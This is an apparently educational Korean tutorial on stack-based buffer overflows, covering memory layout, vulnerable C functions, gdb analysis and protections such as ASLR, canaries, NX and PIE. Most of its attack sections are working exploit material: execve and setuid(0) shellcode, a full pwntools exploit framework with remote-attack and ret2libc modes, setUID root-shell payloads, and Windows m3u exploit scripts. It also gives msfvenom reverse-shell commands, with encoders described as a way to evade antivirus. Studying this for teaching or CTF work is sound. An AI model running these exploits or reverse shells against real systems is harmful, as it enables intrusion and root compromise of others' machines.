> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# Buffer Overflow — 스택 기반 오버플로우 완전 정복

## 0. 초보자를 위한 개념 이해

### 버퍼 오버플로우란?

버퍼 오버플로우(Buffer Overflow)는 프로그램에서 정해진 크기의 메모리 영역(버퍼)에 그 크기를 초과하는 데이터를 입력했을 때 발생하는 취약점입니다. 초과된 데이터가 인접한 메모리를 덮어쓰면서 프로그램의 실행 흐름을 바꿀 수 있어 매우 위험합니다.

**왜 배우는가:**
```
버퍼 오버플로우의 위험성:

  C언어 코드 예시:
    char buffer[10];        // 10바이트 버퍼 선언
    gets(buffer);           // 입력 길이 확인 없이 받음!
    → "AAAAAAAAAAAAAAAAAA..." 20바이트 입력
    → 버퍼를 넘어 리턴 주소(Return Address)를 덮어씀
    → 프로그램이 공격자가 원하는 코드를 실행!

  역사적 사례:
  Morris Worm (1988) → 인터넷 최초 웜, BOF 이용
  MS-IIS (2001)     → Code Red 웜
  MS08-067          → Conficker 웜, 전 세계 수백만 대 감염
```

### 핵심 개념 정리

```
스택 메모리 구조 (함수 호출 시):

  높은 주소
  ┌─────────────────────┐
  │   함수 인자 (args)   │
  ├─────────────────────┤
  │   리턴 주소 (RET)    │ ← 이것을 덮어쓰는 것이 목표!
  ├─────────────────────┤
  │   저장된 EBP         │
  ├─────────────────────┤
  │   지역 변수/버퍼     │ ← 여기에 데이터 입력
  └─────────────────────┘
  낮은 주소

오버플로우 과정:
  1. 버퍼(낮은 주소)에 과도한 데이터 입력
  2. 버퍼 → EBP → 리턴 주소 순서로 덮어씀
  3. 리턴 주소를 공격자 코드 위치로 변경
  4. 함수 종료 시 공격자 코드로 점프

보호 기법 (현대 시스템):
  Stack Canary  → 버퍼와 리턴 주소 사이 감시값 삽입
  ASLR          → 주소 랜덤화 (리턴 주소 예측 어렵게)
  NX/DEP        → 스택 영역 코드 실행 금지
```

### 필요한 도구 및 환경
- **취약한 바이너리**: 보호 기법 없이 컴파일된 연습용 프로그램 (`gcc -fno-stack-protector -z execstack`)
- **디버거**: gdb + pwndbg/peda 플러그인 — 레지스터/스택 실시간 확인
- **익스플로잇 프레임워크**: pwntools 라이브러리 — 패턴 생성, 오프셋 계산, 익스플로잇 자동화

### 기초 실습 예제
```python
#!/usr/bin/env python3
"""BOF 오프셋 계산 및 익스플로잇 페이로드 생성 (교육용)."""
import struct
from typing import Optional

def create_cyclic_pattern(length: int) -> bytes:
    """
    De Bruijn 시퀀스 기반 오프셋 탐지 패턴 생성.
    이 패턴을 입력 후 크래시 시점의 EIP 값으로 오프셋을 특정.
    """
    charset = b"abcdefghijklmnopqrstuvwxyz"
    pattern = bytearray()
    for i in range(length):
        idx = i % len(charset)
        pattern.append(charset[idx])
    return bytes(pattern)

def build_bof_payload(
    offset: int,           # 버퍼 시작 ~ 리턴 주소까지 거리
    ret_address: int,      # 덮어쓸 리턴 주소 (shellcode 위치 등)
    shellcode: bytes = b"",
) -> bytes:
    """
    스택 기반 BOF 익스플로잇 페이로드 조합.
    실습 환경(보호 기법 없는 바이너리)에서만 사용.
    """
    padding = b"A" * offset                         # 버퍼 채우기
    ret = struct.pack("<I", ret_address)             # 리틀 엔디안 주소
    payload = padding + ret + shellcode
    return payload

if __name__ == "__main__":
    # 오프셋 탐지용 패턴 (gdb에서 크래시 후 EIP 값으로 오프셋 계산)
    pattern = create_cyclic_pattern(200)
    print(f"패턴 (처음 20바이트): {pattern[:20]}")

    # 예시: 오프셋 112바이트, 리턴 주소 0xbffff6d0
    payload = build_bof_payload(112, 0xBFFFF6D0)
    print(f"페이로드 크기: {len(payload)}바이트")
    print(f"처음 20바이트: {payload[:20]}")
```

---

## 1. 메모리 구조 기초

### 프로세스 메모리 레이아웃

프로세스 메모리는 코드·데이터·힙·스택 영역으로 분리되어 있습니다. 버퍼 오버플로우 공격은 스택 영역에서 할당된 버퍼 크기를 초과하여 리턴 주소(Return Address)를 덮어쓰는 원리로 동작합니다.

```
High Address
┌─────────────────────────┐
│      Stack (스택)        │ ← 지역변수, 함수 인자, 리턴 주소
│       ↓ (증가)           │
│─────────────────────────│
│                         │
│─────────────────────────│
│       ↑ (증가)           │
│      Heap (힙)           │ ← malloc, calloc, new
│─────────────────────────│
│      BSS                │ ← 초기화되지 않은 전역/정적 변수
│─────────────────────────│
│      Data               │ ← 초기화된 전역/정적 변수
│─────────────────────────│
│      Text (Code)        │ ← 실행 코드, 상수
└─────────────────────────┘
Low Address
```

### 스택(Stack) 구조

스택은 높은 주소에서 낮은 주소 방향으로 성장하며, ESP가 현재 스택 최상단을 가리킵니다. 함수 호출 시 리턴 주소와 지역 변수가 이 영역에 쌓이므로, 버퍼 오버플로우로 리턴 주소를 조작하면 실행 흐름을 바꿀 수 있습니다.

```
IA-32 (32비트) 스택:
- 높은 주소에서 낮은 주소 방향으로 성장
- PUSH: ESP 감소 후 값 저장
- POP:  값 읽기 후 ESP 증가
- ESP: 스택 최상단 포인터 (Stack Pointer)
- EBP: 스택 프레임 베이스 포인터 (Base Pointer)

스택 프레임 구조:
┌──────────────────┐  High Address
│  이전 함수 인자   │
│──────────────────│
│  Return Address  │ ← BoF로 덮어쓸 핵심 대상
│──────────────────│
│  Saved EBP       │ ← 이전 EBP 값
│──────────────────│
│  Local Variable1 │ ← EBP - 4
│  Local Variable2 │ ← EBP - 8
│  buffer[128]     │ ← gets(), strcpy() 등으로 오버플로우
└──────────────────┘  Low Address (← ESP)
```

---

## 2. Buffer Overflow 원리

### 취약한 코드 예시

크기 검사 없이 사용자 입력을 버퍼에 복사하는 `strcpy()`, `gets()` 등의 함수가 버퍼 오버플로우의 주요 원인입니다. 아래 코드는 64바이트 버퍼에 임의 크기의 입력을 받아 스택을 오염시킬 수 있는 취약한 예시입니다.

```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];        // 64바이트 버퍼
    strcpy(buffer, input);  // 크기 검사 없음! → 취약
    printf("Input: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    vulnerable_function(argv[1]);
    return 0;
}
```

### 스택 상태 변화
```
정상 실행 시:
┌────────────────┐
│  argv[1]       │  "hello" (5바이트)
│  ...           │
│ Return Address │  0x08048400
│ Saved EBP      │  0xbfff1000
│ buffer[64]     │  "hello\0..."
└────────────────┘

공격 시 (64 + 4 + 4 + 4 = 72바이트 이상 입력):
┌────────────────┐
│ Return Address │  0x41414141 (AAAA) ← 제어권 탈취!
│ Saved EBP      │  0x41414141 (AAAA)
│ buffer[64]     │  AAAA...AAAA (64개)
└────────────────┘
```

---

## 3. gets() 함수 취약점

### gets() vs fgets() 비교

gets() 함수는 입력 길이를 제한하지 않아 버퍼 오버플로우에 취약합니다. 반드시 fgets()나 입력 길이를 검증하는 함수로 대체해야 합니다.

```c
// 위험: gets()는 입력 길이 제한 없음
char buf[64];
gets(buf);          // 취약! 얼마든지 입력 가능

// 안전: fgets()는 크기 제한
char buf[64];
fgets(buf, sizeof(buf), stdin);  // 안전
```

### 취약한 함수 목록
| 함수 | 위험 | 대체 안전 함수 |
|------|------|---------------|
| gets() | 크기 무제한 | fgets() |
| strcpy() | 크기 검사 없음 | strncpy(), strlcpy() |
| strcat() | 크기 검사 없음 | strncat(), strlcat() |
| sprintf() | 출력 크기 무제한 | snprintf() |
| scanf("%s") | 크기 제한 없음 | scanf("%63s") |

---

## 4. 엔디안(Endian) 이해 — 핵심 개념

### 빅 엔디안 vs 리틀 엔디안
```
값 0x12345678을 메모리에 저장:

Big Endian (네트워크 바이트 오더):
주소: 0x100  0x101  0x102  0x103
값:   0x12   0x34   0x56   0x78   ← 높은 바이트가 낮은 주소

Little Endian (x86/x64 Intel):
주소: 0x100  0x101  0x102  0x103
값:   0x78   0x56   0x34   0x12   ← 낮은 바이트가 낮은 주소
```

### 익스플로잇에서의 엔디안
```python
# x86 리틀 엔디안으로 주소 패킹
import struct

address = 0xbfff1234
# 메모리에: \x34\x12\xff\xbf
packed = struct.pack('<I', address)
print(repr(packed))  # b'\x34\x12\xff\xbf'

# 익스플로잇 코드에서
payload  = b"A" * 64         # 버퍼 채우기
payload += b"B" * 4          # Saved EBP 덮기
payload += struct.pack('<I', 0xbfff1234)  # Return Address 덮기
```

---

## 5. 메모리 Hexdump 분석

### gdb로 메모리 확인

GDB(GNU Debugger)는 리눅스 환경에서 버퍼 오버플로우를 분석하고 검증하는 핵심 도구입니다. PEDA 또는 pwndbg 플러그인을 함께 사용하면 레지스터·스택·힙 상태를 컬러로 시각화하여 분석이 훨씬 편리해집니다.

```bash
# 컴파일 (보호 기법 비활성화)
gcc -o vuln vuln.c -fno-stack-protector -z execstack -no-pie

# GDB 실행
gdb ./vuln
(gdb) disas main
(gdb) disas vulnerable_function

# 브레이크포인트 설정 및 실행
(gdb) break *vulnerable_function+XX
(gdb) run $(python3 -c "print('A'*80)")

# 레지스터 확인
(gdb) info registers
(gdb) x/16x $esp      # ESP부터 16개 hex 값 출력
(gdb) x/s $eax        # EAX를 문자열로 출력
(gdb) x/10i $eip      # EIP부터 10개 명령어 출력
```

### Hexdump 읽기
```
메모리 덤프 예시:
0xbfff1000: 41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41   AAAAAAAAAAAAAAAA
0xbfff1010: 41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41   AAAAAAAAAAAAAAAA
...
0xbfff1040: 42 42 42 42  78 56 34 12                              BBBB.x4.

분석:
0xbfff1000 ~ 0xbfff103F: 'A' 64개 (buffer 영역)
0xbfff1040 ~ 0xbfff1043: 'B' 4개 (Saved EBP 덮임)
0xbfff1044 ~ 0xbfff1047: \x78\x56\x34\x12 = 0x12345678 (Return Address)
```

---

## 6. 실전 Buffer Overflow 공격

### 단계별 공격 절차
```
1단계: 취약점 확인 (Fuzzing)
   → 큰 입력값으로 크래시 유발

2단계: 오프셋 계산 (EIP까지의 거리)
   → Cyclic 패턴으로 정확한 오프셋 파악

3단계: Return Address 확인
   → 셸코드 위치 또는 유용한 가젯 주소

4단계: 익스플로잇 작성
   → payload = padding + new_return_address + shellcode

5단계: 공격 실행 및 쉘 획득
```

### Cyclic 패턴으로 오프셋 계산

pwntools의 cyclic 패턴으로 EIP까지의 오프셋을 정확하게 계산합니다. 패턴을 입력 후 충돌 시 EIP 값으로 정확한 덮어쓰기 오프셋을 구합니다.

```python
from pwn import *

# Cyclic 패턴 생성 (200바이트)
pattern = cyclic(200)
print(pattern)
# aaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaas...

# EIP에 들어간 값으로 오프셋 계산
# 예: EIP = 0x61616166 ('faaa')
offset = cyclic_find(0x61616166)
print(offset)  # → 20 (버퍼부터 EIP까지 20바이트)

# pwntools GDB 자동화 — 오프셋 측정 헬퍼
def measure_offset(binary: str, pattern_size: int = 300, timeout: int = 5) -> int | None:
    """바이너리를 실행해 crash 코어에서 오프셋 자동 측정."""
    context.arch = "i386"
    elf = ELF(binary, checksec=False)
    p = process(binary)
    p.sendline(cyclic(pattern_size))
    p.wait(timeout=timeout)
    try:
        core = p.corefile
        return cyclic_find(core.eip)
    except Exception:
        return None
```

### 셸코드 (Linux x86)

execve("/bin/sh") 셸코드를 익스플로잇 페이로드에 삽입합니다. null 바이트가 없는 23바이트 셸코드로 /bin/sh를 실행합니다.

```python
# execve("/bin/sh", 0, 0) 셸코드 (23바이트)
shellcode = (
    b"\x31\xc0"             # xor eax, eax
    b"\x50"                 # push eax (null terminator)
    b"\x68\x2f\x2f\x73\x68" # push "//sh"
    b"\x68\x2f\x62\x69\x6e" # push "/bin"
    b"\x89\xe3"             # mov ebx, esp
    b"\x50"                 # push eax
    b"\x53"                 # push ebx
    b"\x89\xe1"             # mov ecx, esp
    b"\x31\xd2"             # xor edx, edx
    b"\xb0\x0b"             # mov al, 0x0b (execve syscall)
    b"\xcd\x80"             # int 0x80
)
```

### 완성된 익스플로잇 (NOP Sled + Shellcode)


EIP를 제어한 후에는 실제 실행할 셸코드를 버퍼에 삽입해야 합니다. 셸코드는 보통 `/bin/sh` 실행이나 리버스 셸 연결을 수행하는 소형 기계어 코드이며, `msfvenom`으로 다양한 플랫폼과 페이로드를 생성할 수 있습니다.

```python
#!/usr/bin/env python3
"""
pwntools 기반 BOF 익스플로잇 프레임워크 — 로컬/리모트/GDB 세 가지 모드 지원
사용법:
  python3 bof_exploit.py              # 로컬 실행
  python3 bof_exploit.py --remote HOST PORT   # 원격 공격
  python3 bof_exploit.py --gdb        # GDB 디버깅
  python3 bof_exploit.py --find-offset  # cyclic 패턴으로 오프셋 자동 탐지
"""
import argparse
import sys
from pathlib import Path

try:
    from pwn import (
        ELF, ROP, cyclic, cyclic_find, flat, log, p32, p64,
        process, remote, gdb, context, asm, shellcraft,
    )
except ImportError:
    sys.exit("[!] pwntools가 필요합니다: pip3 install pwntools")


# ── 대상 바이너리 설정 ─────────────────────────────────────────
BINARY = "./vuln"          # 공격 대상 바이너리 경로
ARCH   = "i386"            # i386 또는 amd64
OS     = "linux"

context.arch = ARCH
context.os   = OS
context.log_level = "info"


def find_offset(binary_path: str, pattern_size: int = 300) -> int | None:
    """cyclic 패턴으로 EIP/RIP 오프셋 자동 계산."""
    log.info(f"오프셋 탐지 중... (패턴 크기: {pattern_size})")
    pattern = cyclic(pattern_size)

    try:
        elf = ELF(binary_path, checksec=False)
        p = process(binary_path)
        p.sendline(pattern)
        p.wait()

        core = p.corefile
        if context.arch == "i386":
            crashed_eip = core.eip
            offset = cyclic_find(crashed_eip)
        else:
            crashed_rsp = core.read(core.rsp, 4)
            offset = cyclic_find(crashed_rsp)

        log.success(f"오프셋 발견: {offset}")
        return offset
    except Exception as e:
        log.warning(f"자동 탐지 실패: {e}  — gdb로 수동 확인 필요")
        return None


def build_payload(elf: ELF, offset: int, use_rop: bool = False) -> bytes:
    """
    페이로드 구성:
    - NX 비활성화: NOP Sled + Shellcode
    - NX 활성화:   ROP 체인
    """
    if use_rop or bool(elf.nx):
        log.info("NX 활성화 — ROP 체인 구성")
        rop = ROP(elf)

        # ret2libc 패턴: system("/bin/sh") 호출
        try:
            system_addr = elf.plt.get("system") or elf.symbols["system"]
            binsh_addr  = next(elf.search(b"/bin/sh\x00"))
            ret_gadget  = rop.find_gadget(["ret"])[0]  # 스택 정렬용

            if context.arch == "amd64":
                rdi_gadget = rop.find_gadget(["pop rdi", "ret"])[0]
                chain = flat(
                    b"A" * offset,
                    p64(ret_gadget),     # 16바이트 스택 정렬
                    p64(rdi_gadget),
                    p64(binsh_addr),
                    p64(system_addr),
                )
            else:
                chain = flat(
                    b"A" * offset,
                    p32(system_addr),
                    p32(0xdeadbeef),  # 가짜 반환 주소
                    p32(binsh_addr),
                )
            log.info(f"ROP 체인 구성 완료 ({len(chain)}바이트)")
            return chain
        except Exception as e:
            log.warning(f"ROP 구성 실패: {e}  — NOP Sled 방식으로 전환")

    # NOP Sled + 셸코드 방식
    log.info("NOP Sled + Shellcode 페이로드 구성")
    if context.arch == "amd64":
        shellcode = asm(shellcraft.amd64.linux.sh())
        packer = p64
    else:
        shellcode = asm(shellcraft.i386.linux.sh())
        packer = p32

    nop_sled = b"\x90" * 64

    # 리턴 주소: 스택에서 NOP Sled 예상 위치 (gdb로 정확한 주소 확인 필요)
    ret_addr = 0xbfff1090  # 실습 환경에서 gdb로 확인 후 수정

    padding = b"A" * (offset - len(nop_sled) - len(shellcode))
    payload = nop_sled + shellcode + padding + packer(ret_addr)

    log.info(f"페이로드: {len(payload)}바이트  |  RET: {hex(ret_addr)}")
    return payload


def exploit(args: argparse.Namespace) -> None:
    binary_path = args.binary

    if not Path(binary_path).exists():
        sys.exit(f"[!] 바이너리 없음: {binary_path}")

    elf = ELF(binary_path, checksec=True)
    context.binary = elf

    # 오프셋 탐지 모드
    if args.find_offset:
        find_offset(binary_path, args.pattern_size)
        return

    offset = args.offset
    if offset is None:
        offset = find_offset(binary_path)
        if offset is None:
            offset = int(input("[?] 오프셋 수동 입력: "))

    payload = build_payload(elf, offset, use_rop=args.rop)

    # 연결 방식 선택
    if args.remote:
        host, port = args.remote
        log.info(f"원격 연결: {host}:{port}")
        io = remote(host, int(port))
    elif args.gdb_mode:
        log.info("GDB 디버그 모드")
        io = gdb.debug(binary_path, gdbscript="""
            break *vulnerable_function
            continue
        """)
    else:
        log.info(f"로컬 실행: {binary_path}")
        io = process(binary_path)

    try:
        log.info(f"페이로드 전송 ({len(payload)}바이트)")
        io.sendlineafter(b":", payload) if args.prompt else io.sendline(payload)
        io.interactive()
    except EOFError:
        log.failure("연결 종료 — 크래시 발생 또는 오프셋 오류")
    finally:
        io.close()


def main() -> None:
    parser = argparse.ArgumentParser(
        description="pwntools BOF 익스플로잇 프레임워크",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("-b", "--binary", default=BINARY, help="대상 바이너리")
    parser.add_argument("-o", "--offset", type=int, help="EIP/RIP 오프셋 (미지정 시 자동 탐지)")
    parser.add_argument("--remote", nargs=2, metavar=("HOST", "PORT"), help="원격 공격 모드")
    parser.add_argument("--gdb", dest="gdb_mode", action="store_true", help="GDB 디버깅 모드")
    parser.add_argument("--find-offset", action="store_true", help="cyclic으로 오프셋만 탐지")
    parser.add_argument("--pattern-size", type=int, default=300, help="cyclic 패턴 크기")
    parser.add_argument("--rop", action="store_true", help="ROP 체인 강제 사용")
    parser.add_argument("--prompt", action="store_true", help="입력 프롬프트 대기 후 전송")
    args = parser.parse_args()
    exploit(args)


if __name__ == "__main__":
    main()
```

---

## 7. setUID 비트를 이용한 권한 상승

### setUID 개념

setUID 비트가 설정된 파일은 실행 시 파일 소유자 권한으로 동작합니다. root 소유의 setUID 프로그램이 취약하면 권한 상승에 악용됩니다.

```bash
# setUID: 파일 실행 시 소유자(보통 root) 권한으로 실행
ls -la /usr/bin/passwd
# -rwsr-xr-x 1 root root ... /usr/bin/passwd
#    ^-- s: setUID 비트 (실행 시 root 권한)

# 취약한 setUID 프로그램이 있으면 root 권한 쉘 획득 가능!
find / -perm -4000 -type f 2>/dev/null
```

### setUID 취약 프로그램 공격 예시

버퍼 오버플로우 취약점이 있는 setUID 프로그램 예시입니다. 이 프로그램을 익스플로잇하면 root 권한의 셸을 획득할 수 있습니다.

```c
// 취약한 setUID 프로그램 (./vuln_suid)
// 소유자: root, setUID 설정됨
#include <stdio.h>
#include <string.h>

void copy(char *src) {
    char buf[32];
    strcpy(buf, src);  // 취약!
}

int main(int argc, char **argv) {
    copy(argv[1]);
    return 0;
}
```

```python
# setUID 프로그램 공격으로 root 쉘 획득
import struct

# root 쉘 획득 셸코드 (setuid(0) + execve /bin/sh)
shellcode = (
    b"\x31\xc0\x31\xdb\xb0\x17\xcd\x80"  # setuid(0)
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    b"\x53\x89\xe1\xb0\x0b\xcd\x80"       # execve(/bin/sh)
)

offset = 44  # buffer(32) + saved_ebp(4) + 8 (alignment)
ret_addr = struct.pack('<I', 0xbfff1234)

payload = b"\x90" * 16 + shellcode
payload += b"A" * (offset - len(payload))
payload += ret_addr

print(repr(payload))
```

---

## 8. 보호 기법

### ASLR (Address Space Layout Randomization)

ASLR(주소 공간 배치 난수화) 상태를 확인합니다. ASLR이 활성화되면 스택, 힙, 라이브러리의 주소가 매 실행마다 변경되어 익스플로잇이 어려워집니다.

```bash
# ASLR 상태 확인
cat /proc/sys/kernel/randomize_va_space
# 0 = 비활성화
# 1 = 부분 활성화
# 2 = 완전 활성화

# ASLR 비활성화 (실습용)
echo 0 > /proc/sys/kernel/randomize_va_space

# ASLR 우회 기법:
# - Brute Force (32비트 주소 공간 작음)
# - Information Leak (주소 유출 취약점 활용)
# - NOP Sled 활용 (명중률 향상)
```

### Stack Canary

스택 카나리(Canary)는 버퍼 오버플로우를 탐지하는 보호 기법입니다. 함수 리턴 전에 카나리 값이 변경되면 스택 스매싱 오류를 발생시킵니다.

```bash
# GCC 컴파일 시 기본 활성화
gcc -fstack-protector-all vuln.c -o vuln  # 활성화
gcc -fno-stack-protector vuln.c -o vuln   # 비활성화 (실습용)

# 동작: 스택 프레임 끝에 카나리 값 삽입
# 함수 종료 전 카나리 값 검증, 변조 시 프로그램 종료
```

### DEP/NX (Data Execution Prevention / No-Execute)

DEP/NX는 스택과 힙 메모리에서 코드 실행을 차단합니다. 이 보호를 우회하려면 ROP(Return Oriented Programming) 기법이 필요합니다.

```bash
# 스택 실행 불가 설정 (기본값)
gcc -z noexecstack vuln.c  # NX 활성화
gcc -z execstack vuln.c    # NX 비활성화 (실습용)

# NX 우회 기법: ROP (Return Oriented Programming)
# → 실행 권한이 있는 기존 코드 조각(gadget) 재사용
```

### PIE (Position Independent Executable)

PIE(위치 독립 실행 파일)는 ASLR과 결합하여 바이너리 자체도 랜덤 주소에 로드합니다. PIE가 활성화되면 코드 베이스 주소를 먼저 리크해야 합니다.

```bash
# ASLR + PIE 조합 시 바이너리 자체도 랜덤 주소에 로드
gcc -pie -fPIE vuln.c  # PIE 활성화
gcc -no-pie vuln.c     # PIE 비활성화

# 확인
checksec --file=vuln   # pwntools 포함 도구
```

---

## 9. Windows 스택 기반 BOF — 단계별 실전 공격

### 9-1. 크래시 유발 (Fuzzing)

Windows 애플리케이션에서 BOF를 공격하는 첫 단계는 큰 입력값으로 크래시를 유발하는 것이다.

```perl
# Perl로 악의적인 m3u 파일 생성 (Easy RM to MP3 예제)
my $file = "crash.m3u";
my $junk = "\x41" x 30000;   # 'A' 30000개
open($FILE, ">$file");
print $FILE "$junk";
close($FILE);
print "m3u File Created Successfully\n";
```

크래시 발생 시 WinDbg에서 EIP가 `41414141`('AAAA')이 되면 EIP 제어가 가능하다는 의미이다.

### 9-2. EIP 오프셋 계산 (Metasploit Pattern)


Metasploit Framework는 취약점 익스플로잇 자동화 플랫폼입니다. `search`로 취약점에 맞는 모듈을 찾고, `use`로 선택 후 `set RHOSTS`, `set PAYLOAD`로 대상과 페이로드를 지정하여 공격을 실행합니다.

```bash
# Metasploit pattern_create로 고유 패턴 생성
./pattern_create.rb 5000

# 패턴으로 크래시 유발 후 WinDbg에서 EIP 값 확인
# EIP = 6A42376A 처럼 나오면 pattern_offset으로 계산
./pattern_offset.rb 0x6a42376a 5000
# → 1072  (EIP까지의 오프셋)
```

```python
# pwntools로 동일 작업
from pwn import *
pattern = cyclic(5000)
offset = cyclic_find(0x6a42376a)
print(offset)  # 1072
```

### 9-3. EIP 제어 확인


퍼저로 충돌 발생 지점을 찾은 뒤 MSF 패턴으로 정확한 오프셋을 계산합니다. `msf-pattern_create`로 고유 패턴을 생성해 전송하고, 충돌 후 EIP 값을 `msf-pattern_offset`으로 분석하면 EIP까지의 정확한 바이트 오프셋을 구할 수 있습니다.

```perl
# 오프셋 확인 스크립트
my $file = "eip_control.m3u";
my $junk = "\x41" x 26072;    # 오프셋 이전 패딩
my $eip  = "BBBB";             # EIP 자리 (42424242로 확인)
my $rest = "C" x 1000;         # ESP 이후 데이터
open($FILE, ">$file");
print $FILE $junk.$eip.$rest;
close($FILE);
```

WinDbg에서 EIP = `42424242`, ESP에 'C' 값이 확인되면 제어 성공.

### 9-4. JMP ESP 주소 탐색

직접 메모리 주소(`0x000ff730` 등)에 점프하면 null 바이트 문제로 실패한다. 대신 `JMP ESP` 명령이 있는 DLL 주소를 활용한다.

```bash
# JMP ESP opcode: \xff\xe4
# WinDbg에서 DLL 범위 내 검색
s 01980000 l 019f1000 ff e4

# findjmp 도구로 검색
findjmp MSRMCcodec02.dll esp
# → 0x01BBF23A  jmp esp  (null 바이트 없는 주소 선택)
```

JMP ESP 주소를 EIP에 덮어써서 스택 위의 셸코드로 실행 흐름을 전환합니다. 모듈 중 null 바이트가 없는 주소를 선택합니다.

```perl
# JMP ESP 주소로 EIP 덮어쓰기
my $eip = pack('V', 0x01bbf23a);  # little-endian 패킹
```

### 9-5. NOP Sled + 셸코드 삽입

NOP Sled는 셸코드 앞에 배치하는 NOP(0x90) 명령어 배열입니다. 주소가 정확하지 않아도 NOP를 타고 셸코드까지 도달하여 안정성을 높입니다.

```perl
# 최종 익스플로잇 구조
my $file = "exploit.m3u";
my $junk      = "\x41" x 26072;
my $eip       = pack('V', 0x01bbf23a);  # JMP ESP 주소
my $nop_sled  = "\x90" x 25;            # NOP 슬레드
my $shellcode = (                        # msfvenom으로 생성한 셸코드
    "\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1" .
    "\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30" .
    # ... (실제 셸코드)
    "\x7f\xe8\x7b\xca"
);
open($FILE, ">$file");
print $FILE $junk.$eip.$nop_sled.$shellcode;
close($FILE);
```

### 9-6. msfvenom으로 셸코드 생성

msfvenom으로 Windows용 셸코드를 생성합니다. 인코더로 null 바이트를 제거하고 AV 탐지를 우회하는 옵션을 사용할 수 있습니다.

```bash
# Windows x86 계산기 실행 셸코드
msfvenom -p windows/exec CMD=calc.exe -f perl

# Windows x86 리버스 쉘
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
  -b "\x00\x0a\x0d" -f perl

# 인코더 적용 (Bad Char 우회)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=... LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -f c
```

---

## 10. 쉘코드로 점프하는 다양한 방법

크래시 발생 시 레지스터 상태에 따라 여러 점프 기법을 사용할 수 있다.

### 10-1. CALL [register]

ESP가 셸코드를 직접 가리킬 때 사용.

```bash
# kernel32.dll에서 CALL ESP 검색
findjmp kernel32.dll esp
# 0x7C8369F0  call esp
# 0x7C86467B  jmp esp
```

JMP ESP 주소를 EIP에 덮어써서 스택 위의 셸코드로 실행 흐름을 전환합니다. 모듈 중 null 바이트가 없는 주소를 선택합니다.

```perl
my $eip = pack('V', 0x7c8369f0);  # CALL ESP 주소
my $extra = "XXXX";                # ESP가 셸코드 시작을 가리키도록 4바이트 추가
```

### 10-2. POP/RET — ESP+offset에 셸코드가 있을 때

```
POP 기계어:
  pop eax → 0x58
  pop ebx → 0x5b
  pop ecx → 0x59
  pop edx → 0x5a
  pop esi → 0x5e
  pop ebp → 0x5d
  ret     → 0xc3

pop/pop/ret 기계어: 58 5d c3 (또는 다른 레지스터 조합)
```

POP/POP/RET은 SEH(구조화 예외 처리) 기반 익스플로잇에서 사용됩니다. 두 번의 POP으로 예외 핸들러 포인터를 적재하고 RET으로 점프합니다.

```perl
# pop/pop/ret 주소로 EIP 덮어쓰기
# ESP+8에 JMP ESP 주소를, 그 뒤에 셸코드 배치
my $eip   = pack('V', 0x01966a10);  # pop/pop/ret 주소
my $jmpesp = pack('V', 0x01bbf23a); # JMP ESP 주소 (ESP+8 위치에)

# 페이로드 구조:
# [AAAA...] [pop/pop/ret addr] [XXXX] [NOP x8] [JMP ESP addr] [NOP] [Shellcode]
```

### 10-3. PUSH ESP + RET

'push esp; ret' 가젯은 ESP 값을 스택에 저장하고 그 주소로 점프합니다. 셸코드가 ESP 이하에 위치할 때 사용하는 기법입니다.

```bash
# 'push esp; ret' 기계어: 54 c3
# DLL에서 검색
findjmp MSRMCcodec00.dll esp
# → 0x019557F6  push esp / ret
```

'push esp; ret' 가젯 주소로 EIP를 덮어쓴 최종 익스플로잇입니다. 셸코드 위치를 정확히 파악한 후 적용합니다.

```perl
my $eip = pack('V', 0x019557f6);  # push esp / ret 주소
```

### 10-4. JMP [ESP+offset]

JMP [ESP+offset]은 ESP에 상수 오프셋을 더한 주소로 점프하는 가젯입니다. 셸코드 위치가 ESP에서 일정 거리 떨어진 경우에 사용합니다.

```bash
# JMP [ESP+8] 기계어: ff 64 24 08
# WinDbg에서 확인:
# a  (assemble 모드)
# jmp [esp+8]
# u (unassemble로 기계어 확인)
```

### 10-5. 작은 버퍼 우회 — 앞쪽 버퍼에 셸코드 삽입

EIP 이후 ESP 공간이 부족하면 EIP 이전의 큰 패딩 공간에 셸코드를 심고 점프 코드(jump code)로 이동한다.

```perl
# ESP+515 위치의 버퍼로 점프하는 코드 (ADD ESP 반복 + JMP ESP)
my $jump_code =
    "\x83\xc4\x67" .  # add esp, 0x67
    "\x83\xc4\x67" .  # add esp, 0x67
    "\x83\xc4\x67" .  # add esp, 0x67
    "\x83\xc4\x67" .  # add esp, 0x67
    "\x83\xc4\x67" .  # add esp, 0x67
    "\xff\xe4";        # jmp esp

# 구조: [NOP+Shellcode+A...] [JMP_ESP_addr] [XXXX] [jump_code]
#                 ↑ EIP 이전 큰 버퍼    ↑EIP      ↑ESP  ↑점프 코드
```

---

## 11. BOF 왕기초편 — 원리부터 실습까지 (PDF 시리즈 정리)

### 11-1. 프로그램 공격의 출발점

버퍼 오버플로우 공격의 대상이 되는 프로그램의 핵심 특징:

1. 사용자로부터 입력을 받는 프로그램이다.
2. 입력 내용에 따라 프로그램 실행 결과가 달라진다.
3. 비정상적으로 긴 문자열을 입력하면 프로그램이 비정상 동작한다.
4. `Segmentation fault` 에러 = 프로그램이 스스로 에러를 자백하는 것.

```c
// 취약한 프로그램 예 (PDF 01의 test.c)
main()
{
    char name[20];
    printf("당신의 이름을 입력하세요. : ");
    gets(name);                          // 취약점 발생 지점
    printf("아, 당신의 이름은 %s이군요.\n", name);
}
// 실행: AAAA...A (100개 이상) 입력 → Segmentation fault
```

### 11-2. 버퍼(Buffer) 개념

**버퍼** = 데이터가 한 곳에서 다른 곳으로 이동할 때 임시 보관되는 메모리 공간.

- CPU 내부, 하드디스크, 프린터, 네트워크, 프로그램 등 어디에나 존재
